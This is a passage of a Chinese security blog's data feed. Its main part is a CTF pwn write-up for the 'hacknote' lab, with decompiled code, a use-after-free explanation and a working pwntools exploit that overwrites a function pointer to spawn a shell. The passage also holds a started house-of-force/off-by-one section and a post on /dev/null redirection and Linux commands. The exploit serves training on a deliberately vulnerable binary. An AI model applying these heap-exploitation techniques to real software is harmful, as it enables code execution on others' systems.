punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Note size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        size <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        v0 <span class="token operator">=</span> notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        v0<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å†ä¸ºè¾“å…¥çš„å†…å®¹ï¼ˆcontentï¼‰ç”³è¯·ç©ºé—´</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è¯»å–å†…å®¹</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">++</span>count<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>deleteå‡½æ•°:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> count <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å…ˆfreeæ‰content</span>    <span class="token function">free</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//å†freeè‡ªå·±</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>print_note:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> count <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>è¿˜å¯ä»¥çœ‹åˆ°ä¸€ä¸ª<code>magicï¼ˆaddr = 0x08048986)</code>å‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°å°±æ˜¯æˆ‘ä»¬çš„ç›®æ ‡å“¦ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102205533.png" class="lazyload"></p><blockquote><p> è§£é¢˜é€»è¾‘ï¼šé€šè¿‡ä¸Šé¢å¯¹fastbinï¼Œuafçš„äº†è§£åï¼Œå¤§æ¦‚å¯ä»¥ç†è§£è¿™ä¸ªé¢˜ç›®çš„è§£é¢˜æ–¹æ³•äº†ã€‚æˆ‘ä»¬é¦–å…ˆè¦æ˜ç™½mallocå’Œfreeæœºåˆ¶ï¼Œå…ˆè¢«freeæ‰çš„å—ä¼šå¾ˆå¿«è¢«åº”ç”¨äºæ–°çš„mallocï¼Œå‰ææ˜¯å¤§å°åˆé€‚ï¼Œä¾‹å¦‚<code>free v1; v2 = malloc(4)</code>ï¼Œå¦‚æœåŸæ¥v1çš„å¤§å°ä¹Ÿä¸º4ï¼Œé‚£ä¹ˆv1åŸæ¥çš„é‚£å—å†…å­˜å°±ä¼šè¢«åˆ†é…ç»™v2ï¼Œé€šè¿‡v1å¯ä»¥ï¼ˆuafï¼‰è®¿é—®v2çš„å†…å®¹ã€‚</p><p>Fï¼ŒAï¼ŒUï¼ˆå…ˆFREE,å†ä¿®æ”¹chunkï¼Œè°ƒç”¨chunkä¸­çš„å‡½æ•°æŒ‡é’ˆï¼‰ã€‚è®©ä¸¤ä¸ªæŒ‡é’ˆå®é™…æŒ‡å‘åŒä¸€ä¸ªchunkï¼Œä¸€ä¸ªæŒ‡é’ˆæŠŠå†…å­˜è§£é‡Šä¸ºå­—ç¬¦ä¸²ï¼Œä»è€Œå†™å…¥ä»»æ„å€¼ï¼Œå¦ä¸€ä¸ªæŒ‡é’ˆæŠŠå†…å­˜è§£é‡Šä¸ºå‡½æ•°æŒ‡é’ˆï¼Œä»è€Œæ§åˆ¶äº†EIPã€‚</p></blockquote><h3 id="æ„é€ EXP"><a href="#æ„é€ EXP" class="headerlink" title="æ„é€ EXP"></a>æ„é€ EXP</h3><p>å€Ÿé‰´veritas501å¸ˆå‚…çš„EXPï¼Œç¨åŠ ä¿®æ”¹å’Œç†è§£ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span>bin <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#æ·»åŠ </span><span class="token keyword">def</span> <span class="token function">add_note</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#åˆ é™¤â€”â€”free</span><span class="token keyword">def</span> <span class="token function">del_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#æ‰“å°</span><span class="token keyword">def</span> <span class="token function">print_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sizeéšæ„ï¼Œä¸ç­‰äº8å°±è¡Œ</span>add_note<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">'aaa'</span><span class="token punctuation">)</span>add_note<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">'bbb'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#contentçš„å¤§å°ä¸ç­‰äº8ï¼ˆè¿™æ˜¯ç¨‹åºä¸­note_chunkçš„å¤§å°,note_chunkå°±æ˜¯ç¬¬ä¸€æ¬¡mallocçš„é‚£ä¸ªï¼‰ï¼Œæ˜¯ä¸ºäº†ç­‰ä¼šåˆ†é…8 bytesçš„contentä¸ä¼šè¢«åˆ†é…åˆ°ä¹‹å‰çš„contentçš„binä¸Šï¼Œè€Œæ˜¯åˆ†é…åˆ°noteçš„binä¸Šã€‚</span><span class="token comment" spellcheck="true">#æŒ‰ç…§mallocå’Œfreeæœºåˆ¶ï¼Œå¦‚æœæˆ‘ä»¬del_noteæ¢ä¸€ä¸‹ä½ç½®ï¼Œå…ˆdel_note(1)ï¼Œnote2_chunkä¼šè¢«æ”¾åœ¨åŸæ¥çš„note0_chunkä½ç½®ï¼Œè€Œnote3_contenté‡Œçš„magicå‡½æ•°åœ°å€å°±ä¼šè¢«æ”¾åœ¨note1_chunkä½ç½®ï¼Œåé¢çš„print_note(0)ï¼ŒåŒæ ·ä¹Ÿéœ€è¦æ”¹ä¸ºprint_note(1)ï¼Œæ‰èƒ½getshell</span>del_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>del_note<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add_note<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>bin<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'magic'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>print_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102214243.png" class="lazyload"></p><h2 id="lab11-bamboobox"><a href="#lab11-bamboobox" class="headerlink" title="lab11-bamboobox"></a>lab11-bamboobox</h2><h3 id="hof-house-of-force"><a href="#hof-house-of-force" class="headerlink" title="hof (house of force)"></a>hof (house of force)</h3><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_force.html" target="_blank" rel="noopener">heap-exploitationâ€”â€”house of forceå‚è€ƒé“¾æ¥</a></p><blockquote><p>å¼•ç”¨m4xå¤§ä½¬åšå®¢åŸè¯ï¼š</p><p>ç®€å•è¯´ä¸€ä¸‹æˆ‘å¯¹ hof çš„ç†è§£ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶ <strong>top_chunk</strong> çš„ <strong>size</strong>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ§åˆ¶ malloc ä¸€äº›ç²¾å¿ƒè®¾è®¡çš„<strong>å¤§æ•°/è´Ÿæ•°</strong>æ¥å®ç°æ§åˆ¶ top_chunk çš„æŒ‡é’ˆï¼Œå°±å¯ä»¥å®ç°ä»»æ„åœ°å€å†™çš„æ•ˆæœï¼Œä¸ªäººæ„Ÿè§‰ï¼Œhof çš„æ ¸å¿ƒæ€æƒ³å°±åœ¨è¿™ä¸ª force ä¸Šï¼Œç–¯ç‹‚ mallocï¼Œç®€å•ç²—æš´æ•ˆæœæ˜æ˜¾ã€‚</p></blockquote><h3 id="off-by-oneæ¼æ´"><a href="#off-by-oneæ¼æ´" class="headerlink" title="off_by_oneæ¼æ´"></a>off_by_oneæ¼æ´</h3><blockquote><p><a href="https://blog.csdn.net/nibiru_holmes/article/details/62040763" target="_blank" rel="noopener">å‚è€ƒé“¾æ¥</a></p><p>ä¸€ä¸ªå­—èŠ‚æº¢å‡ºè¢«ç§°ä¸ºoff-by-oneï¼Œæ›¾ç»çš„ä¸€æ®µæ—¶é—´é‡Œï¼Œoff-by-oneè¢«è®¤ä¸ºæ˜¯ä¸å¯ä»¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯åæ¥ç ”ç©¶å‘ç°åœ¨å †ä¸Šå“ªæ€•åªæœ‰ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºä¹Ÿä¼šå¯¼è‡´ä»»æ„ä»£ç çš„æ‰§è¡Œã€‚</p></blockquote><blockquote><p>==&gt; off-by-oneæ€»å…±å¯ä»¥åˆ†ä¸ºä¸¤ç§åˆ©ç”¨æ–¹å¼:</p><p><strong>chunk overlapping</strong></p><ul><li><p>off-by-one overwrite allocated</p></li><li><p>off-by-one overwrite freed</p></li><li><p>off-by-one null byte</p></li></ul><p><strong>unlink</strong></p><ul><li><p>off-by-one small bin</p></li><li><p>off-by-one large bin</p></li></ul></blockquote><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p><a href="https://github.com/bash-c/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf" target="_blank" rel="noopener">unlinkâ€”â€”pdf</a></p><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½-1"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½-1" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p>checksec it!</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102221726.png" class="lazyload"></p><p>å¼€å¯äº†NX,Stackï¼ŒåŒæ ·æ— æ³•é€šè¿‡å¸¸è§„æ–¹å¼æ¥æ”»å‡»ã€‚</p></blockquote><p>å¾…æ›´æ–°ã€‚ã€‚ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> äºŒè¿›åˆ¶å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>/dev/nullå’Œå¸¸ç”¨linuxå‘½ä»¤é›†</title>
      <link href="/2018/11/01/devnull%E5%92%8C%E5%B8%B8%E7%94%A8linux%E5%91%BD%E4%BB%A4%E9%9B%86/"/>
      <url>/2018/11/01/devnull%E5%92%8C%E5%B8%B8%E7%94%A8linux%E5%91%BD%E4%BB%A4%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>/dev/nullå’Œå¸¸ç”¨linuxå‘½ä»¤é›†ã€‚</p><a id="more"></a><h1 id="dev-null"><a href="#dev-null" class="headerlink" title="/dev/null"></a>/dev/null</h1><blockquote><p>ğŸ˜­å› ä¸ºå¿˜äº†å‚è€ƒäº†å“ªäº›æ–‡ç« ï¼Œæ‰€ä»¥å¦‚è‹¥æœ‰ä¾µæƒä¹‹å¤„ï¼Œè¿˜è¯·è”ç³»åšä¸»ã€‚</p></blockquote><h2 id="dev-null-ä¸-é‡å®šå‘"><a href="#dev-null-ä¸-é‡å®šå‘" class="headerlink" title="/dev/null ä¸ é‡å®šå‘"></a>/dev/null ä¸ é‡å®šå‘</h2><p>==&gt; /dev/null æ˜¯linuxç³»ç»Ÿä¸­çš„ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶è®¾å¤‡ï¼Œä»–çš„ä½œç”¨æ˜¯æ¥å—ä¸€åˆ‡è¾“å…¥å®ƒçš„æ•°æ®å¹¶ä¸¢å¼ƒè¿™äº›æ•°æ®,é€šå¸¸è¢«å½“åšåƒåœ¾æ¡¶æ¥ç”¨ã€‚å°†è¾“å‡ºæµé‡å®šå‘åˆ°/dev/nullä¸Šé¢ï¼Œå°±æ˜¯ä¸¢å¼ƒè¿™ä¸ªè¾“å‡ºæµä¸Šçš„æ‰€æœ‰è¾“å‡ºï¼Œ/dev/nullä¹Ÿå«linuxä¸­çš„é»‘æ´ã€‚</p><p><strong>0:è¡¨ç¤ºé”®ç›˜è¾“å…¥(stdin)</strong></p><p><strong>1:è¡¨ç¤ºæ ‡å‡†è¾“å‡º(stdout),</strong>ç³»ç»Ÿé»˜è®¤æ˜¯1 </p><p><strong>2:è¡¨ç¤ºé”™è¯¯è¾“å‡º(stderr)</strong> </p><pre class=" language-bash"><code class="language-bash"><span class="token string">"command >/dev/null 2>&amp;1 &amp;"</span>  ä¸ <span class="token string">"command 1>/dev/null 2>&amp;1 &amp;"</span>  çš„æ„æ€ä¸€æ ·1<span class="token punctuation">)</span> command:   è¡¨ç¤ºshellå‘½ä»¤æˆ–è€…ä¸ºä¸€ä¸ªå¯æ‰§è¡Œç¨‹åº2<span class="token punctuation">)</span> <span class="token operator">></span>:  è¡¨ç¤ºé‡å®šå‘åˆ°å“ªé‡Œ 3<span class="token punctuation">)</span> /dev/null:  è¡¨ç¤ºLinuxçš„ç©ºè®¾å¤‡æ–‡ä»¶ 4<span class="token punctuation">)</span> 2:  è¡¨ç¤ºæ ‡å‡†é”™è¯¯è¾“å‡º5<span class="token punctuation">)</span> <span class="token operator">&amp;</span>1:  <span class="token operator">&amp;</span>è¡¨ç¤ºç­‰åŒäºçš„æ„æ€,  2<span class="token operator">></span><span class="token operator">&amp;</span>1è¡¨ç¤º2çš„è¾“å‡ºé‡å®šå‘äº16<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token keyword">:</span>  **è¡¨ç¤ºåå°æ‰§è¡Œ,å³è¿™æ¡æŒ‡ä»¤æ‰§è¡Œåœ¨åå°è¿è¡Œ** </code></pre><p>==&gt; æ¯”å¦‚ find -user root   2&gt;/dev/null  &gt;1.txt &amp;ï¼Œå°±æ˜¯å°†æ–‡ä»¶ç”¨æˆ·å±æ€§ä¸ºrootçš„æ–‡æ–‡ä»¶ååŠå…¶è·¯å¾„é‡å®šå‘åˆ°æ–‡ä»¶1.txtä¸­</p><p><strong>==&gt; ä½†æ˜¯</strong> find -user root   1&gt;/dev/null å´æ˜¯ä¸ä¸Šä¸€æ¡å‘½ä»¤ä¸åŒçš„ï¼Œç”¨çš„æ˜¯æ ‡å‡†è¾“å‡ºæµï¼Œä¸ä¼šæ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼Œåªèƒ½è¾“å‡ºåˆ°æ–‡ä»¶ä¸­ï¼›å¦‚æœåŠ ç‚¹ä¸œè¥¿ä¸Šå»å˜æˆ find -user root   1&gt;/dev/null 1&gt;&amp;2 é‚£ä¹ˆæ ‡å‡†è¾“å‡ºæµè¢«é‡å®šå‘åˆ°æ ‡å‡†é”™è¯¯è¾“å‡ºæµï¼Œå°±ä¼šåœ¨å±å¹•ä¸Šæ˜¾ç¤ºæŸ¥æ‰¾åˆ°çš„ä¿¡æ¯äº†ã€‚</p><p>==&gt; å†æ¯”å¦‚ grep -Ri woshiflag.py 2&gt;/dev/null 1&gt;&amp;2 ,å°±æ˜¯å°†ä¸woshiflag.pyè„šæœ¬æœ‰å…³çš„æ–‡ä»¶åˆ—å‡ºï¼Œå¹¶ä¸”å°†æ ‡å‡†è¾“å‡ºæµé‡å®šå‘åˆ°æ ‡å‡†é”™è¯¯è¾“å‡ºæµ,æ˜¾ç¤ºåˆ°å±å¹•ä¸Šã€‚</p><hr><pre class=" language-bash"><code class="language-bash">- <span class="token function">command</span> <span class="token operator">></span> <span class="token function">file</span> 2<span class="token operator">></span>file- <span class="token function">command</span> <span class="token operator">></span> <span class="token function">file</span> 2<span class="token operator">></span><span class="token operator">&amp;</span>1</code></pre><p><strong>ä¸åŒç‚¹: I/Oæ•ˆç‡ä¸Šçš„å·®å¼‚</strong> </p><p> ==&gt; command 1&gt;file 2&gt;file è¿™æ ·çš„å†™æ³•,stdoutå’Œstderréƒ½ç›´æ¥é€åˆ°fileä¸­, fileä¼šè¢«æ‰“å¼€ä¸¤æ¬¡,è¿™æ ·stdoutå’Œstderrä¼šäº’ç›¸è¦†ç›–,è¿™æ ·å†™ç›¸å½“ä½¿ç”¨äº†FD1å’ŒFD2ä¸¤ä¸ªåŒæ—¶å»æŠ¢å fileçš„ç®¡é“ã€‚ </p><p>==&gt; command 1&gt;file 2&gt;&amp;1 è¿™æ¡å‘½ä»¤å°±å°†stdoutç›´æ¥é€å‘file, stderr ç»§æ‰¿äº†FD1ç®¡é“å,å†è¢«é€å¾€file,æ­¤æ—¶,fileåªè¢«æ‰“å¼€äº†ä¸€æ¬¡,ä¹Ÿåªä½¿ç”¨äº†ä¸€ä¸ªç®¡é“FD1,å®ƒåŒ…æ‹¬äº†stdoutå’Œstderrçš„å†…å®¹ã€‚</p><p>==&gt; ä»I/O æ•ˆç‡ä¸Š,å‰ä¸€æ¡å‘½ä»¤çš„æ•ˆç‡è¦æ¯”åé¢ä¸€æ¡çš„å‘½ä»¤æ•ˆç‡è¦ä½,æ‰€ä»¥åœ¨ç¼–å†™shellè„šæœ¬çš„æ—¶å€™,æœ€å¤šçš„æ—¶å€™æˆ‘ä»¬ä¼šcommand 1&gt;file 2&gt;&amp;1 è¿™æ ·çš„å†™æ³•ï¼Œ æˆ– â€œcommand &gt;file 2&amp;1â€ </p><h1 id="linux-å¸¸ç”¨å‘½ä»¤é›†"><a href="#linux-å¸¸ç”¨å‘½ä»¤é›†" class="headerlink" title="linux å¸¸ç”¨å‘½ä»¤é›†"></a>linux å¸¸ç”¨å‘½ä»¤é›†</h1><h2 id="ç³»ç»Ÿä¿¡æ¯"><a href="#ç³»ç»Ÿä¿¡æ¯" class="headerlink" title="ç³»ç»Ÿä¿¡æ¯"></a>ç³»ç»Ÿä¿¡æ¯</h2><pre class=" language-bash"><code class="language-bash">arch æ˜¾ç¤ºæœºå™¨çš„å¤„ç†å™¨æ¶æ„<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token function">uname</span> -m æ˜¾ç¤ºæœºå™¨çš„å¤„ç†å™¨æ¶æ„<span class="token punctuation">(</span>2<span class="token punctuation">)</span> <span class="token function">uname</span> -r æ˜¾ç¤ºæ­£åœ¨ä½¿ç”¨çš„å†…æ ¸ç‰ˆæœ¬ dmidecode -q æ˜¾ç¤ºç¡¬ä»¶ç³»ç»Ÿéƒ¨ä»¶ - <span class="token punctuation">(</span>SMBIOS / DMI<span class="token punctuation">)</span> hdparm -i /dev/hda ç½—åˆ—ä¸€ä¸ªç£ç›˜çš„æ¶æ„ç‰¹æ€§ hdparm -tT /dev/sda åœ¨ç£ç›˜ä¸Šæ‰§è¡Œæµ‹è¯•æ€§è¯»å–æ“ä½œ <span class="token function">cat</span> /proc/cpuinfo æ˜¾ç¤ºCPU infoçš„ä¿¡æ¯ <span class="token function">cat</span> /proc/interrupts æ˜¾ç¤ºä¸­æ–­ <span class="token function">cat</span> /proc/meminfo æ ¡éªŒå†…å­˜ä½¿ç”¨ <span class="token function">cat</span> /proc/swaps æ˜¾ç¤ºå“ªäº›swapè¢«ä½¿ç”¨ <span class="token function">cat</span> /proc/version æ˜¾ç¤ºå†…æ ¸çš„ç‰ˆæœ¬ <span class="token function">cat</span> 